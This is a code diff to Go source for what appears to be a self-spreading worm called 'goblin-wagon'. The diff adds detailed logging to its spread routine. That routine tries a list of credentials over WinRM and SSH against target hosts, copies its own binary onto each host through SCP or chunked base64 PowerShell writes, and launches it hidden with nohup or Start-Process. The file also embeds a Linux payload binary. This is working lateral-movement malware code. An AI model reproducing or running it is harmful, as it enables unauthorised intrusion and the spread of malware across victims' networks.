@@ -166,40 +166,43 @@ func spread() {
             defer wg.Done()
             done := make(chan string, 2)
 
-            // try all creds via WinRM
-            go func() {
-                for _, c := range creds {
-                    client, err := establish_winRM(ip, c.user, c.pass)
-                    if err != nil {
-                        continue
-                    }
-                    log.Printf("[+] WinRM auth succeeded on %s with %s", ip, c.user)
-                    if err := drop_and_run_winrm(client, selfData); err != nil {
-                        log.Printf("[-] WinRM drop failed on %s: %v", ip, err)
-                        continue
-                    }
-                    done <- "winrm"
-                    return
-                }
-            }()
+            
+			go func() {
+				for _, c := range creds {
+					log.Printf("[*] WinRM | %s | trying %s", ip, c.user)
+					client, err := establish_winRM(ip, c.user, c.pass)
+					if err != nil {
+						log.Printf("[-] WinRM | %s | auth failed for %s: %v", ip, c.user, err)
+						continue
+					}
+					log.Printf("[+] WinRM | %s | auth succeeded with %s", ip, c.user)
+					if err := drop_and_run_winrm(client, selfData, ip); err != nil {
+						continue
+					}
+					done <- "winrm"
+					return
+				}
+				log.Printf("[-] WinRM | %s | all creds exhausted", ip)
+			}()
 
-            // try all creds via SSH
-            go func() {
-                for _, c := range creds {
-                    client, err := establish_SSH(ip, c.user, c.pass)
-                    if err != nil {
-                        continue
-                    }
-                    log.Printf("[+] SSH auth succeeded on %s with %s", ip, c.user)
-                    defer client.Close()
-                    if err := drop_and_run_ssh(client, selfData); err != nil {
-                        log.Printf("[-] SSH drop failed on %s: %v", ip, err)
-                        continue
-                    }
-                    done <- "ssh"
-                    return
-                }
-            }()
+			go func() {
+				for _, c := range creds {
+					log.Printf("[*] SSH | %s | trying %s", ip, c.user)
+					client, err := establish_SSH(ip, c.user, c.pass)
+					if err != nil {
+						log.Printf("[-] SSH | %s | auth failed for %s: %v", ip, c.user, err)
+						continue
+					}
+					log.Printf("[+] SSH | %s | auth succeeded with %s", ip, c.user)
+					defer client.Close()
+					if err := drop_and_run_ssh(client, selfData, ip); err != nil {
+						continue
+					}
+					done <- "ssh"
+					return
+				}
+				log.Printf("[-] SSH | %s | all creds exhausted", ip)
+			}()
 
             select {
             case method := <-done:
@@ -212,14 +215,15 @@ func spread() {
     wg.Wait()
 }
 
-func drop_and_run_ssh(client *ssh.Client, data []byte) error {
+func drop_and_run_ssh(client *ssh.Client, data []byte, ip string) error {
+    log.Printf("[*] SSH | %s | opening session for SCP drop", ip)
     session, err := client.NewSession()
     if err != nil {
         return err
     }
     defer session.Close()
 
-    // SCP the binary
+    log.Printf("[*] SSH | %s | writing %d bytes via SCP", ip, len(data))
     go func() {
         w, _ := session.StdinPipe()
         defer w.Close()
@@ -229,39 +233,62 @@ func drop_and_run_ssh(client *ssh.Client, data []byte) error {
     }()
 
     if err := session.Run("scp -t /tmp/goblin-wagon"); err != nil {
+        log.Printf("[-] SSH | %s | SCP transfer failed: %v", ip, err)
         return err
     }
+    log.Printf("[+] SSH | %s | binary dropped to /tmp/goblin-wagon", ip)
 
-    // execute
     execSession, err := client.NewSession()
     if err != nil {
         return err
     }
     defer execSession.Close()
 
-    return execSession.Run("chmod +x /tmp/goblin-wagon && nohup /tmp/goblin-wagon &")
+    log.Printf("[*] SSH | %s | executing payload", ip)
+    if err := execSession.Run("chmod +x /tmp/goblin-wagon && nohup /tmp/goblin-wagon &"); err != nil {
+        log.Printf("[-] SSH | %s | execution failed: %v", ip, err)
+        return err
+    }
+
+    log.Printf("[+] SSH | %s | payload executing on target", ip)
+    return nil
 }
 
-func drop_and_run_winrm(client *winrm.Client, data []byte) error {
+func drop_and_run_winrm(client *winrm.Client, data []byte, ip string) error {
     encoded := base64.StdEncoding.EncodeToString(data)
     tmpPath := `C:\Windows\Temp\goblin-wagon.exe`
     chunkSize := 8000
+    totalChunks := (len(encoded) + chunkSize - 1) / chunkSize
 
+    log.Printf("[*] WinRM | %s | clearing existing payload", ip)
     run_WinRM_cmds(client, fmt.Sprintf(`powershell -Command "Remove-Item -Force '%s' -ErrorAction SilentlyContinue"`, tmpPath))
 
+    log.Printf("[*] WinRM | %s | dropping %d bytes in %d chunks", ip, len(data), totalChunks)
     for i := 0; i < len(encoded); i += chunkSize {
         end := i + chunkSize
         if end > len(encoded) {
             end = len(encoded)
         }
+        chunk := (i / chunkSize) + 1
+        log.Printf("[*] WinRM | %s | writing chunk %d/%d", ip, chunk, totalChunks)
+
         cmd := fmt.Sprintf(`powershell -Command "$f=[System.Convert]::FromBase64String('%s'); $fs=[System.IO.File]::Open('%s',[System.IO.FileMode]::Append); $fs.Write($f,0,$f.Length); $fs.Close()"`,
             encoded[i:end], tmpPath)
         if err := run_WinRM_cmds(client, cmd); err != nil {
+            log.Printf("[-] WinRM | %s | chunk %d/%d failed: %v", ip, chunk, totalChunks, err)
             return fmt.Errorf("chunk write failed: %v", err)
         }
     }
+    log.Printf("[+] WinRM | %s | binary dropped to %s", ip, tmpPath)
 
-    return run_WinRM_cmds(client, fmt.Sprintf(`powershell -Command "Start-Process '%s' -WindowStyle Hidden"`, tmpPath))
+    log.Printf("[*] WinRM | %s | executing payload", ip)
+    if err := run_WinRM_cmds(client, fmt.Sprintf(`powershell -Command "Start-Process '%s' -WindowStyle Hidden"`, tmpPath)); err != nil {
+        log.Printf("[-] WinRM | %s | execution failed: %v", ip, err)
+        return err
+    }
+
+    log.Printf("[+] WinRM | %s | payload executing on target", ip)
+    return nil
 }
 
 //go:embed binaries/payload_linux_amd64
